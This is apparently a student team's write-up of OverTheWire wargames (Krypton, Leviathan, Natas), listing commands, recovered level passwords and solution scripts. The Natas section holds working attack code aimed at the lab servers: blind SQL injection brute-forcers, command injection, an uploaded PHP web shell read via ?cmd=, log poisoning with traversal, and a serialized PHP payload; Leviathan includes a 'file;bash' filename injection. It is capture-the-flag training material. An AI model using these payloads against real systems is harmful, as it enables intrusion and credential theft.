@@ -1,0 +1,668 @@
+Cybersecurity War-games Report
+DIGISURAKSHA PARHARI FOUNDATION
+
+Team Members:
+•	Niranjan Dorugade –Krypton
+•	Swayam Chougule – Natas , commond.txt
+•	Abhishek Panwar – Leviathan, report.pdf
+
+
+Krpyton- OverTheWire
+
+A. Level0-Level1
+Commands Use to Solve the Level:
+
+ 1.echo "S1JZUFRPTklTR1JFQVQ=" | base64 -d
+ 2.ssh -p 2231 krypton1@krypton.labs.overthewire.org
+ 3.This is a OverTheWire game server. More information on http://www.overthewire.org/wargames    
+ 4.krypton1@krypton.labs.overthewire.org's password:
+
+B. Level1-Level2
+Commands Use to Solve the Level:
+
+ 1.cat krypton2
+ 2.cat krypton2 | tr "[ABCDEFGHIJKLMNOPQRSTUVWXYZ]" "[NOPQRSTUVWXYZABCDEFGHIJKLM]"
+ 3.cat krypton2 | tr "[A-Z]" "[N-ZA-M]"
+ 4.cat krypton2 | tr "[A-Z]" "[N-M]"
+ 5.logout
+ 6.ssh -p 2231 krypton2@krypton.labs.overthewire.org
+
+C. Level2-Level3
+Commands Use to Solve the Level:
+
+ 1.touch ptext
+ 2.nano ptext
+ 3.cat ptext
+ 4./krypton/krypton2/encrypt ptext
+ 5.ls
+ 6.cat ciphertext
+ 7.cat /krypton/krypton2/krypton3 | tr "[MNOPQRSTUVWXYZABCDEFGHIJKL]" "[A-Z]"
+ 8.cat /krypton/krypton2/krypton3 | tr "[N-M]" "[A-Z]"
+ 9.cat /krypton/krypton2/krypton3 | tr "[N-M]" "[A-Z]"
+ 10.ssh -p 2231 krypton3@krypton.labs.overthewire.org
+
+D. Level3-Level4
+Commands Use to Solve the Level:
+
+ 1.U: 99, B: 87, G: 81, N: 74, D: 69, Z: 57, ...
+ 2.cat krypton4 | tr '[JDSQBKVI]' '[THEAOWL]'
+ 3.cat krypton4 | tr '[JDSQBKVIWGXUNCXM]' '[THEAOWLDNPSRIFU]'
+ 4.tr '[JDSQBKVIWG]' '[THEAOWLDN]'
+
+E. Level4-Level5
+Commands Use to Solve the Level:
+
+ 1.echo "S1JZUFRPTklTR1JFQVQ=" | base64 -d
+ 2.ssh -p 2231 krypton1@krypton.labs.overthewire.org
+ 3.cat krypton2 | tr "[ABCDEFGHIJKLMNOPQRSTUVWXYZ]" "[NOPQRSTUVWXYZABCDEFGHIJKLM]"
+ 4.cat /krypton/krypton2/krypton3 | tr "[MNOPQRSTUVWXYZABCDEFGHIJKL]" "[A-Z]"
+ 5./krypton/krypton2/encrypt ptext
+
+F. Level5-Level6
+Commands Use to Solve the Level:
+
+ 1.python3 vigenere_decoder.py /krypton/krypton5/krypton6 KEYLENGTH
+ 2.logout
+ 3.ssh -p 2231 krypton6@krypton.labs.overthewire.org
+
+G. Level6-Level7
+Commands Use to Solve the Level:
+
+ 1.cat a.txt
+ 2.cat /krypton/krypton6/encrypt6 a.txt cipher_a.txt
+ 3.cat cipher_a.txt
+ 4.ls
+ 5.python3 vigenere_decoder.py /krypton/krypton6/krypton7 EICTDGYIYZKTHNSIRFXYCPFUEOCKRN
+  
+
+Leviathan- OverTheWire
+
+A. Level0-Level1
+Commands Use to Solve the Level:
+
+ 1)ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+2) ls ls -la
+3) cd .backup/
+ ls
+bookmarks.html
+4) cat bookmarks.html
+ grep password bookmarks.html
+leviathan1 is 3QJ3TgzHDq
+ exit
+logout
+5)mkdir -p OTW\Leviathan
+cd OTW\Leviathan
+6)touch 1.txt; echo "leviathan0" > 0.txt
+echo "3QJ3TgzHDq" > 1.txt
+
+B. Level1-Level2
+Commands Use to Solve the Level:
+
+1)ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+2)whoami
+leviathan1
+3) ls -la
+4) ./check
+password: null
+Wrong password, Good Bye ...
+5) ltrace ./check                                                               
+getchar(0, 0, 0x786573, 0x646f67password:  null                                                               
+strcmp(" nu", "sex")                                                                                   
+6)./check
+password: sex
+ls
+check
+7)
+ cat /etc/leviathan_pass/leviathan2
+NsN1HwFoyN
+8) exit
+9)exit
+logout
+10)echo " NsN1HwFoyN" > 2.txt
+
+C. Level2-Level3
+Commands Use to Solve the Level:
+
+1)ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+2)ls
+printfile
+3) ls -la
+total 36
+4) ./printfile
+*** File Printer ***
+5)  ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+6) ./printfile /etc/passwd
+7) ltrace ./printfile /etc/passwd
+8) ltrace ./printfile /etc/passwd
+9)mktemp -d
+/tmp/tmp.JOA0bUnIne
+10)cd /tmp/tmp.JOA0bUnIne
+11)touch 'file;bash'
+leviathan2@gibson:/tmp/tmp.JOA0bUnIne$ ls
+file;bash
+12) cd
+ls
+printfile
+13)ls
+printfile
+14)cat /etc/leviathan_pass/leviathan3
+f0n8h2iWLP
+15)exit
+exit
+
+D. Level3-Level4
+Commands Use to Solve the Level:
+
+1)ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+2) ls
+level3
+3)ls -la
+total 40
+4) ./level3
+Enter the password> null
+5) ltrace ./level3
+fgets(Enter the password> hello
+strcmp("hello\n", "snlprintf\n")
+6) ./level3
+Enter the password> snlprintf
+7) ls
+level3
+8) cat /etc/leviathan_pass/leviathan4
+WG1egElCvO
+9) exit
+leviathan3@gibson:~$ exit
+10)echo "WG1egElCvO" > 4.txt
+ls
+0.txt   1.txt  '1.txt;'   2.txt   3.txt   4.txt   echo   leviathan0
+
+E. Level4-Level5
+Commands Use to Solve the Level:
+
+1) ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+2)whoami
+leviathan4
+3) ls
+ ls -la
+4) cd .trash/
+5) ls
+bin
+ls -la
+total 24
+6)./bin
+00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
+7)exit
+8)echo "0dyxT7F4QD" > 5.txt
+
+F. Level5-Level6
+Commands Use to Solve the Level:
+
+1)ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+2) ls
+leviathan5
+3)ls -la
+total 36
+4)./leviathan5
+Cannot find /tmp/file.log
+5) ltrace ./leviathan5
+6)touch /tmp/file.log ; echo "hello" > /tmp/file.log
+7) cat /tmp/file.log
+hello
+8)touch /tmp/file.log ; echo "hello" > /tmp/file.log
+ls
+leviathan5
+9) ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+10) ./leviathan5
+szo7HDB88w
+11)exit
+logout
+12)echo "szo7HDB88w" > 6.txt
+
+G. Level6-Level7
+Commands Use to Solve the Level:
+1)ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+2)ls
+leviathan6
+3)./leviathan6
+usage: ./leviathan6 <4 digit code>
+4)ltrace ./leviathan6
+5)for i in {0000..9999}; do echo $i; ./leviathan6 $i;done;
+7122
+wrong 
+7123
+6) whoami
+leviathan7
+7)ls 
+leviathan6
+8)cat /etc/leviathan_pass/leviathan7
+qEs5Io5yM8
+9) exit
+logout
+10)echo "qEs5Io5yM8" > 7.txt
+
+H. Level7
+1)ssh leviathan7@leviathan.labs.overthewire.org -p 2223
+2)ls
+CONGRATULATIONS
+3)ls -la
+total 24
+4)cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+
+
+Natas- OverTheWire
+
+1. Level 0
+Username: natas0
+Password: natas0
+
+2. Level 1 - Level 2 
+Username: natas1
+Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+
+3. Level 2 - Level 3
+Username: natas2
+Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+Commands use to get the password
+http://natas2.natas.labs.overthewire.org/files/
+http://natas2.natas.labs.overthewire.org/files/users.txt
+
+4. Level 3 - Level 4
+Username: natas3
+Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+5.  Level 4 - Level 5  
+Username: natas4
+Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+Commands use to get the password
+http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+
+6. Level 5 - Level 6  
+Username: natas5
+Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+Commands use to get the password
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
+
+7. Level 6 - Level 7
+Username: natas6
+Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+Commands use to get the password
+curl:-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/
+  
+8. Level 7 - Level 8
+Username: natas7
+Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+  
+9. Level 8 - Level 9
+Username: natas8
+Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+Commands use to get the Password
+ url: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+  
+10. Level 9 - Level 10
+Username: natas9
+Password:  ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+Commands use to get the password
+php secret code: 3d3d516343746d4d6d6c315669563362
+convert the hexadecimal value back to a base64 string: echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p
+Reverse the resulting base64 string:echo "<base64_output>" | rev
+Decode the reversed base64 string to get the original secret:echo "<reversed_base64_output>" | base64 -d
+  
+11. Level 10 - Level 11  
+Username: natas10
+Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+Find words containing: a /etc/natas_webpass/natas10; and hit the search button
+
+12. Level 11 - Level 12
+Username: natas11
+Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+  
+13. Level 12 - Level 13
+Username: natas12
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+  
+14. Level 13 - Level 14
+Username: natas13
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+Commands use to get password
+ http://natas12.natas.labs.overthewire.org/upload/b1fr0jl0q0.php
+ http://natas12.natas.labs.overthewire.org/upload/b1fr0jl0q0.php?cmd=ls
+ http://natas12.natas.labs.overthewire.org/upload/b1fr0jl0q0.php?cmd=cat /etc/natas_webpass/natas13
+  
+15. Level 14 - Level 15
+Username: natas14
+Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+Commands use to get the password
+ÿØÿà
+<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
+  
+16. Level 15 - Level 16
+Username: natas15
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 
+Commands use to get the password
+" OR "1"="1" #
+" ends the current username input.
+OR "1"="1" is a SQL condition that always evaluates to true.
+# comments out the rest of the SQL query to ignore the password condition. 
+SELECT * FROM users WHERE username="" OR "1"="1" # AND password=""
+
+17. Level 16 - Level 17
+Username: natas16
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+Code use to get the password
+import requests
+
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+username = "natas15"
+password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+url = "http://natas15.natas.labs.overthewire.org"
+
+session = requests.Session()
+current_password = []
+
+while True:
+    for character in characters:
+        print("Trying with: " + "".join(current_password) + character)
+        response = session.post(
+            url,
+            data={"username": 'natas16" AND password LIKE BINARY "' + "".join(current_password) + character + '%" #'},
+            auth=(username, password)
+        )
+        if "This user exists." in response.text:
+            current_password.append(character)
+            break
+    if len(current_password) == 32:
+        break
+
+print("The password for natas16 is: " + "".join(current_password))
+
+ 
+18. Level 17 - Level 18  
+Username: natas17
+Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+Code use to get the password
+import requests
+from requests.auth import HTTPBasicAuth
+
+username = 'natas16'
+password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+out = ""
+
+for i in range(0, 32):  # Assuming the password length is 32 characters
+    for j in characters:
+        command = f'$(grep -o ^{out}{j} /etc/natas_webpass/natas17)A'
+        payload = {'needle': command, 'submit': 'Search'}
+        result = requests.get(
+            'http://natas16.natas.labs.overthewire.org/',
+            auth=HTTPBasicAuth(username, password),
+            params=payload
+        )
+        response_text = result.text
+        start = response_text.find('<pre>') + len('<pre>\n')
+        end = response_text.find('</pre>')
+        extracted_text = [x for x in response_text[start:end].split('\n')]
+
+        if extracted_text[0] != 'African':  # Check against an invalid result
+            out += j
+            print(out)  # Incremental output of the password
+            break
+
+print("The final password is:", out)
+
+19. Level 18 - Level 19
+Username: natas18
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+  
+20. Level 19 - Level 20 
+Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+ 
+21. Level 20 - Level 21  
+Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+
+22. Level 21 - Level 22 
+Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+
+23. Level 22 - Level 23  
+Username: natas22
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+Code use to get the password
+import requests
+
+username = 'natas21'
+password = '89OWrTkGmiLZLv12JY4tLj2c4FW06n56'
+
+# URLs for the experimenter and main pages
+url_experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug'
+url = 'http://natas21.natas.labs.overthewire.org/'
+
+# Create a session
+session = requests.Session()
+
+# Send a POST request to the experimenter page to set admin privileges
+response = session.post(
+    url_experimenter,
+    data={"admin": "1", "submit": "1"},
+    auth=(username, password)
+)
+
+# Print the response from the experimenter page
+print(response.text)
+
+# Extract the session ID from cookies
+sessionID = response.cookies['PHPSESSID']
+
+# Use the session ID to access the main page as an admin
+response = session.post(
+    url,
+    cookies={'PHPSESSID': sessionID},
+    auth=(username, password)
+)
+
+# Print the response from the main page
+print(response.text)
+
+24. Level 23 - Level 24
+Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+  
+25. Level 24 - Level 25
+Username: natas24
+Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+Command use to get the password
+http://natas24.natas.labs.overthewire.org/?passwd[]=iloveyou  
+
+26. Level 25 - Level 26 
+Username: natas25
+Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+ 
+27. Level 26 - Level 27
+Username: natas26
+Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+Code use to get the password 
+import requests
+
+# Authentication details
+username = 'natas25'
+password = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
+
+url = 'http://natas25.natas.labs.overthewire.org/'
+
+# Start a session
+session = requests.Session()
+
+# Injecting a malicious User-Agent header
+newHeader = {'User-Agent': "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
+
+# Step 1: Send an initial GET request with the malicious User-Agent header
+response = session.get(url, auth=(username, password), headers=newHeader)
+sessionID = session.cookies.get('PHPSESSID')
+
+# Step 2: Exploit the 'lang' parameter with a precise directory traversal
+# Adjusting the traversal path to ensure it targets the correct log file
+payload = f"....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{sessionID}.log"
+
+# Send a POST request using the crafted payload and malicious User-Agent
+response = session.post(
+    url,
+    auth=(username, password),
+    data={"lang": payload},
+    headers=newHeader
+)
+
+# Output the server's response
+print(response.text)
+  
+28. Level 27 - Level 28
+Username: natas27
+Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+Code use to get the password
+<?php
+class Logger {
+    private $logFile;
+    private $exitMsg;
+
+    function __construct() {
+        // initialise variables
+        $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27');?>";
+        $this->logFile = "img/hmcyberacademy.php";
+    }
+}
+
+$hack = new Logger();
+
+echo base64_encode(serialize($hack));
+  
+29. Level 28 - Level 29
+Username: natas28
+Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+  
+30. Level 29 - Level 30
+Username: natas29
+Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+Code use to get the password
+import requests
+from requests.auth import HTTPBasicAuth
+from urllib.parse import unquote, quote
+import base64
+
+# Updated with the password you provided
+natas28_password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
+
+def makeReq(search_string):
+    data = {"query": search_string}
+    r = requests.post(
+        'http://natas28.natas.labs.overthewire.org/index.php',
+        auth=HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'),
+        data=data,
+    )
+    code = r.url.replace("http://natas28.natas.labs.overthewire.org/search.php/?query=", "")
+    return base64.b64decode(unquote(code))
+
+# Craft the malicious payload
+# First 10 'a's fill block 3, next 15 'a's + \' fill block 4
+# Then we add our SQL injection
+payload = "a"*10 + "a"*15 + "\\' UNION SELECT password FROM users # "
+
+# Get the encoded query
+original_code = makeReq(payload)
+
+# Remove the 4th block (16 bytes) to bypass the escaping
+# Keep first 3 blocks (48 bytes) and everything after 4th block (64 bytes)
+fixed_code = original_code[:48] + original_code[64:]
+
+# Make the final request
+r = requests.get(
+    "http://natas28.natas.labs.overthewire.org/search.php/?query=" + quote(base64.b64encode(fixed_code)),
+    auth=HTTPBasicAuth('natas28', natas28_password)
+)
+
+print("Status Code:", r.status_code)
+print("Response Text:")
+print(r.text)
+  
+31. Level 30 - Level 31
+Username: natas30
+Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+  
+32. Level 31 - Level 32 
+Username: natas31
+Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+Code use to get the password
+import requests
+
+url = "http://natas30.natas.labs.overthewire.org/index.pl"
+
+# Create a session with basic auth
+sess = requests.Session()
+sess.auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+
+# Craft the SQL injection payload
+# Using array with string injection to bypass parameter binding
+data = {
+    "username": "natas31",
+    "password": ["' or 1", 2]  # The array bypasses parameterized queries
+}
+
+# Send the POST request
+resp = sess.post(url, data=data)
+
+# Print the response which should contain the password
+print(resp.text)
+ 
+33. Level 32 - Level 33
+Username: natas32
+Password: a5iNgD8Yc1v8Ggyd5M77xkS7mF2aXPwt
+  
+34. Level 33 - Level 34
+Username: natas33
+Password: U0pWZnlGcEJTZkh2MVQdE5yNG1ZcEZu
+
+35. Level 34
+Username: natas34
+Password: R2pwZHNqS2xZblEyWnpd3lvWktXUUl0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+  
+
+
+ 
+
+
+
+ 
